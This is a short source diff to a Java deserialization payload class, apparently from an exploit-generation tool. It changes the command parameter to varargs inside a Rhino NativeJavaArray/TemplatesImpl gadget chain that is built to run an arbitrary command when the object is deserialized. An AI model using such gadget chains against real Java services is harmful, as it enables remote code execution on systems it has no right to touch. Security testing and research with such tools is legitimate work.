@@ -51,7 +51,7 @@ import java.util.Map;
 @Authors({ Authors.TINT0 })
 public class MozillaRhino2 implements ObjectPayload<Object> {
 
-    public Object getObject( String command) throws Exception {
+    public Object getObject( String ... command) throws Exception {
         ScriptableObject dummyScope = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
@@ -82,7 +82,7 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
 
         NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
         Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
-        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(command));
+        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(command[0]));
         nativeJavaArray.setPrototype(scriptableObject);
         Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);
 
